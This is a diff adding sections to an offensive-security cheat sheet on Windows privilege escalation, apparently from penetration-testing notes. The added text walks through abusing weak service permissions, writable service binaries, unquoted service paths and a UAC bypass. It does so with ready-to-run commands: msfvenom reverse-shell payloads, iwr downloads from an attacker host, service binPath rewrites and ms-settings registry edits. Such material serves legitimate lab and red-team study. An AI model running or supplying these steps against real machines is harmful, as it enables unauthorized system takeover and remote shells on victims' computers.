@@ -309,6 +309,7 @@
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Sharpersist | https://github.com/mandiant/SharPersist |
+| Sharpup | https://github.com/GhostPack/SharpUp |
 
 ### Exploit Databases
 
@@ -5604,6 +5605,116 @@ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'St
 .\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
 ```
 
+##### Weak Service Permissions
+
+###### Enumeration
+
+```c
+SharpUp.exe audit ModifiableServices
+```
+
+```c
+powershell-import C:\Tools\Get-ServiceAcl.ps1
+powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
+```
+
+###### Explotation
+
+Create with msfvenom a malicious exe file:
+
+```c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > payload.exe
+```
+
+Open a listener in attack machine.
+
+Create Temp folder:
+
+```c
+mkdir C:\TempFolder
+```
+Transfer malicious executablr file in Temp folder:
+
+```c
+iwr -Uri http://<ip>:<port>/payload.exe -Outfile C:\TempFolder\payload.exe
+```
+
+Reconfigure the binary path on the vulnerable service:
+
+```c
+sc config "Vulnerable Service" binPath= C:\TempFolder\payload.exe
+```
+
+Verify that the path has indeed been updated:
+
+```c
+sc qc "Vulnerable Service"
+```
+
+###### WeakServiceBinaryPermissions
+
+```c
+SharpUp.exe audit ModifiableServiceBinaries
+```
+Stop the service
+
+```c
+sc stop "Vulnerable Service"
+```
+
+Create with msfvenom a malicious exe file:
+
+```c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service2.exe
+```
+
+Open a listener in attack machine.
+
+Transfer and overwrite the Service.exe file with the malicious binary:
+
+```c
+iwr -Uri http://<ip>:<port>/Service2.exe -Outfile C:\Program Files\CustomSrv2\Service2.exe
+```
+
+Start the service with the following command or reboot the machine:
+
+```c
+sc start "Vulnerable Service"
+```
+###### UACBypass
+
+```c
+SharpUp.exe audit
+```
+
+Use msfvenom to generate a malicious executable (exe) file:
+
+```c
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > payload.exe
+```
+
+Transfer the malicious executable file to victim's machine.
+
+Open a listener on attack machine.
+
+Create with the following PowerShell command a new registry key:
+
+```c
+New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
+```
+
+Create a new registry entry named "DelegateExecute" under the specified registry path with an empty string as the value:
+
+```c
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+```
+
+Modify the default command which executed when the specified registry key is triggered:
+
+```c
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -exec bypass -c C:\<full_path>\<binary.exe>" -Force
+```
+
 ###### Checking Path Permissions to find Unquoted Service Paths
 
 ```c
@@ -6071,14 +6182,66 @@ Place a `.exe` file in the desired folder, then `start` or `restart` the `servic
 
 ```c
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName
-wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+cdm -> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+cmd -> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 Start-Service <SERVICE>
 Stop-Service <SERVICE>
+```
+Use icacls to identify the permissions of the service installation folder
+
+```c
 icacls "C:\"
 icacls "C:\Program Files"
 icacls "C:\Program Files\my example"
 Start-Service <SERVICE>
 Get-LocalGroupMember administrators
+```
+Start the service
+
+```c
+Start-Service <SERVICE>
+Get-LocalGroupMember administrators
+```
+
+Check permisions
+
+```c
+Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
+```
+###### SharpUp 
+
+```c
+SharpUp.exe audit UnquotedServicePath
+```
+
+###### Exploitation
+To abuse this vulnerability you should follow these steps:
+
+Verify the service state:
+```c
+sc query "Vulnerable Service 1"
+```
+
+Create with msfvenom a malicious exe file:
+
+```c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > Service.exe
+```
+
+Open a listener in attack machine.
+
+Transfer the malicious executable in "C:\Program Files\Vulnerable Service1":
+
+```c
+iwr -Uri http://<ip>:<port>/Service.exe -Outfile "C:\Program Files\Vulnerable Service1\Service.exe"
+```
+
+Try to find out if you have the permission to restart the service or re-start the machine:
+
+```c
+sc stop "Vulnerable Service 1"
+
+sc start "Vulnerable Service 1"
 ```
 
 ###### PowerView Example
